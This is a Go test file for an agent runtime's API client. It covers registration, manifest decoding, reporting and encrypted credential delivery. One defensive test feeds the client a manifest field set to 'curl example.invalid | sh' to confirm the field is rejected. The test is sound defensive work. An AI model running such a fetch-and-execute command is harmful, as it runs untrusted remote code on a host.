package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"

	"github.com/warpmetal/warpmetal-agent-runtime/internal/model"
)

func TestClientUsesPublishedRuntimeRoutes(t *testing.T) {
	t.Parallel()

	type requestExpectation struct {
		method        string
		path          string
		authorization string
		response      string
	}
	expected := []requestExpectation{
		{
			method:        http.MethodPost,
			path:          "/internal/runtime/register",
			authorization: "Bearer rtb_test",
			response:      `{"serverId":"srv_example123","nodeToken":"rtn_test","expiresAt":"2099-01-01T00:00:00Z","manifestUrl":"https://api.example/internal/runtime/manifest","reportUrl":"https://api.example/internal/runtime/report"}`,
		},
		{
			method:        http.MethodGet,
			path:          "/internal/runtime/manifest",
			authorization: "Bearer rtn_test",
			response:      `{"serverId":"srv_example123","desiredRevision":1,"sandboxes":[],"accessGrants":[]}`,
		},
		{
			method:        http.MethodPost,
			path:          "/internal/runtime/report",
			authorization: "Bearer rtn_test",
			response:      `{"accepted":true}`,
		},
	}
	requests := make([]requestExpectation, 0, len(expected))
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		index := len(requests)
		if index >= len(expected) {
			t.Errorf("unexpected request %s %s", request.Method, request.URL.Path)
			http.Error(writer, "unexpected request", http.StatusInternalServerError)
			return
		}
		want := expected[index]
		requests = append(requests, requestExpectation{
			method:        request.Method,
			path:          request.URL.Path,
			authorization: request.Header.Get("Authorization"),
		})
		writer.Header().Set("Content-Type", "application/json")
		_, _ = fmt.Fprint(writer, want.response)
	}))
	defer server.Close()

	client := Client{
		Origin:    server.URL + "/ignored-prefix",
		NodeToken: "rtn_test",
		HTTP:      server.Client(),
	}
	ctx := context.Background()
	if _, err := client.Register(ctx, "rtb_test", Registration{ServerID: "srv_example123"}); err != nil {
		t.Fatalf("Register() error = %v", err)
	}
	if _, err := client.Manifest(ctx); err != nil {
		t.Fatalf("Manifest() error = %v", err)
	}
	if err := client.Report(ctx, model.Report{ServerID: "srv_example123"}); err != nil {
		t.Fatalf("Report() error = %v", err)
	}

	for index := range expected {
		expected[index].response = ""
	}
	if !reflect.DeepEqual(requests, expected) {
		t.Fatalf("requests = %#v, want %#v", requests, expected)
	}
}

func TestClientToleratesLegacyManifestFieldsAndOmitsThemFromReports(t *testing.T) {
	t.Parallel()
	var received map[string]any
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "application/json")
		switch request.URL.Path {
		case "/internal/runtime/manifest":
			_, _ = fmt.Fprint(writer, `{
  "serverId":"srv_example123",
  "desiredRevision":1,
  "imageDigest":"registry.example/sandbox@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  "capacity":{"cpuMillicores":500,"memoryMiB":1024,"workspaceDiskGiB":10,"pids":256},
  "sandboxes":[{
    "id":"sbx_example123","name":"main","size":"small",
    "resources":{"cpuMillicores":500,"memoryMiB":1024,"workspaceDiskGiB":10,"pids":256},
    "lifetime":"persistent","expiresInSeconds":null,"startedAt":null,"expiresAt":null,
    "desiredState":"running","generation":1,"cliTools":["codex","cursor"]
  }],
  "accessGrants":[]
}`)
		case "/internal/runtime/report":
			if err := json.NewDecoder(request.Body).Decode(&received); err != nil {
				t.Errorf("decode report: %v", err)
			}
			_, _ = fmt.Fprint(writer, `{"accepted":true}`)
		default:
			http.Error(writer, "unexpected request", http.StatusNotFound)
		}
	}))
	defer server.Close()
	client := Client{Origin: server.URL, NodeToken: "rtn_test", HTTP: server.Client()}
	manifest, err := client.Manifest(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(manifest.Sandboxes) != 1 || manifest.Sandboxes[0].ID != "sbx_example123" {
		t.Fatalf("legacy manifest fields prevented sandbox decoding: %#v", manifest)
	}
	report := model.Report{
		ServerID: "srv_example123",
		Sandboxes: []model.SandboxReport{{
			ID: "sbx_example123", ObservedState: "running", ObservedGeneration: 1,
		}},
		AccessGrants: []model.GrantReport{},
	}
	if err := client.Report(context.Background(), report); err != nil {
		t.Fatal(err)
	}
	sandboxes, ok := received["sandboxes"].([]any)
	if !ok || len(sandboxes) != 1 {
		t.Fatalf("sandbox report was not encoded: %#v", received)
	}
	sandbox, ok := sandboxes[0].(map[string]any)
	if !ok {
		t.Fatalf("sandbox report has unexpected shape: %#v", sandboxes[0])
	}
	if _, exists := sandbox["cliTools"]; exists {
		t.Fatalf("legacy CLI tool status was encoded: %#v", sandbox)
	}
}

func TestClientDecodesCapacityOnlyManifest(t *testing.T) {
	t.Parallel()
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, _ *http.Request) {
		writer.Header().Set("Content-Type", "application/json")
		_, _ = fmt.Fprint(writer, `{
  "serverId":"srv_example123","desiredRevision":1,
  "imageDigest":"registry.example/sandbox@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  "capacity":{"cpuMillicores":500,"memoryMiB":1024,"workspaceDiskGiB":10,"pids":256},
  "sandboxes":[{
    "id":"sbx_example123","name":"main","size":"small",
    "resources":{"cpuMillicores":500,"memoryMiB":1024,"workspaceDiskGiB":10,"pids":256},
    "lifetime":"persistent","expiresInSeconds":null,"startedAt":null,"expiresAt":null,
    "desiredState":"running","generation":1
  }],
  "accessGrants":[]
}`)
	}))
	defer server.Close()
	client := Client{Origin: server.URL, NodeToken: "rtn_test", HTTP: server.Client()}
	manifest, err := client.Manifest(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(manifest.Sandboxes) != 1 || manifest.Sandboxes[0].ID != "sbx_example123" {
		t.Fatalf("capacity-only manifest changed during decode: %#v", manifest)
	}
}

func TestClientRejectsUnknownManifestFields(t *testing.T) {
	tests := []struct {
		name     string
		response string
	}{
		{
			name: "top level shell field",
			response: `{
				"serverId":"srv_example123",
				"desiredRevision":1,
				"sandboxes":[],
				"accessGrants":[],
				"shell":"curl example.invalid | sh"
			}`,
		},
		{
			name: "nested npm materializer unknown field",
			response: `{
				"serverId":"srv_example123",
				"desiredRevision":1,
				"sandboxes":[],
				"accessGrants":[],
				"setupOperations":[{
					"id":"setup-test12345",
					"schemaVersion":1,
					"sandboxId":"sbx_test12345",
					"sandboxGeneration":1,
					"profileId":"profile-test12345",
					"profileRevision":1,
					"profileDigest":"sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
					"materializer":{"kind":"npm-package-set","artifacts":[{"id":"codex-wrapper","source":"https://registry.npmjs.org/@openai/codex/-/codex-0.156.0-alpha.3.tgz","sha256":"sha256:ad521f01018cef9b7975c13a6e3092c9bfd3b4ae27867af3d921686cebe92e2e","format":"npm-tgz","sizeBytes":4911,"packageName":"@openai/codex","packageVersion":"0.156.0-alpha.3","installAs":"@openai/codex","unexpected":"no"}],"bins":["codex"]}
				}]
			}`,
		},
		{
			name: "trailing JSON value",
			response: `{
				"serverId":"srv_example123",
				"desiredRevision":1,
				"sandboxes":[],
				"accessGrants":[]
			} {}`,
		},
	}

	for _, field := range []string{"command", "nestedPrivateProcfs", "apparmorProfile", "bwrapPath", "toolReport", "toolManifest"} {
		tests = append(tests, struct {
			name     string
			response string
		}{
			name:     "caller-controlled sandbox " + field,
			response: fmt.Sprintf(`{"sandboxes":[{"id":"sbx_test12345","%s":"untrusted"}]}`, field),
		})
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, _ *http.Request) {
				writer.Header().Set("Content-Type", "application/json")
				_, _ = fmt.Fprint(writer, test.response)
			}))
			defer server.Close()

			client := Client{
				Origin:    server.URL,
				NodeToken: "rtn_test",
				HTTP:      server.Client(),
			}
			if _, err := client.Manifest(context.Background()); err == nil {
				t.Fatal("expected an unknown manifest field to be rejected")
			}
		})
	}
}

func TestClientBoxCredentialBridgeRoutesAndPayloads(t *testing.T) {
	t.Parallel()
	var registrationBody map[string]json.RawMessage
	var sawCredentialPull bool
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "application/json")
		if got := request.Header.Get("Authorization"); got != "Bearer rtn_test" {
			t.Errorf("authorization = %q, want the node token", got)
		}
		switch {
		case request.Method == http.MethodPost && request.URL.Path == "/internal/runtime/box-encryption-key":
			if err := json.NewDecoder(request.Body).Decode(&registrationBody); err != nil {
				t.Errorf("decode registration body: %v", err)
			}
			_, _ = fmt.Fprint(writer, `{"boxId":"srv_example123","keyFingerprint":"sha256:`+strings.Repeat("a", 64)+`","algorithm":"RSA-OAEP-256","publicKeyJwk":{"kty":"RSA"},"revision":1,"registeredAt":"2026-11-16T00:00:00Z","rotatedAt":null}`)
		case request.Method == http.MethodGet && request.URL.Path == "/internal/runtime/tool-provider-credentials":
			sawCredentialPull = true
			_, _ = fmt.Fprint(writer, `{"items":[{"credentialId":"conn_aaaaaaaaaaaaaaaaaaaaaaaa","providerId":"github","keyFingerprint":"sha256:`+strings.Repeat("a", 64)+`","envelope":{"formatVersion":1}}]}`)
		default:
			t.Errorf("unexpected request %s %s", request.Method, request.URL.Path)
			http.Error(writer, "unexpected request", http.StatusNotFound)
		}
	}))
	defer server.Close()
	client := Client{Origin: server.URL, NodeToken: "rtn_test", HTTP: server.Client()}
	publicKeyJwk := map[string]any{"kty": "RSA", "n": "AQAB", "e": "AQAB", "alg": "RSA-OAEP-256", "ext": true}
	view, err := client.RegisterBoxEncryptionKey(context.Background(), publicKeyJwk)
	if err != nil {
		t.Fatalf("RegisterBoxEncryptionKey() error = %v", err)
	}
	if view.BoxID != "srv_example123" || view.KeyFingerprint != "sha256:"+strings.Repeat("a", 64) {
		t.Fatalf("registration view = %#v", view)
	}
	if len(registrationBody) != 1 {
		t.Fatalf("registration body keys = %v, want only publicKeyJwk", registrationBody)
	}
	var sentJwk map[string]any
	if err := json.Unmarshal(registrationBody["publicKeyJwk"], &sentJwk); err != nil {
		t.Fatalf("decode sent JWK: %v", err)
	}
	if sentJwk["kty"] != "RSA" || sentJwk["alg"] != "RSA-OAEP-256" {
		t.Fatalf("sent JWK = %#v", sentJwk)
	}
	deliveries, err := client.ToolProviderCredentials(context.Background())
	if err != nil {
		t.Fatalf("ToolProviderCredentials() error = %v", err)
	}
	if !sawCredentialPull || len(deliveries) != 1 || deliveries[0].CredentialID != "conn_aaaaaaaaaaaaaaaaaaaaaaaa" {
		t.Fatalf("deliveries = %#v", deliveries)
	}
	if string(deliveries[0].Envelope) != `{"formatVersion":1}` {
		t.Fatalf("envelope bytes = %s, want verbatim wire bytes", deliveries[0].Envelope)
	}
}

func TestClientToolProviderCredentialsRejectsOversizedResponse(t *testing.T) {
	t.Parallel()
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, _ *http.Request) {
		writer.Header().Set("Content-Type", "application/json")
		_, _ = writer.Write([]byte(strings.Repeat(" ", toolProviderCredentialsResponseLimit+1)))
	}))
	defer server.Close()
	client := Client{Origin: server.URL, NodeToken: "rtn_test", HTTP: server.Client()}
	if _, err := client.ToolProviderCredentials(context.Background()); err == nil {
		t.Fatal("oversized credential delivery response was accepted")
	}
}
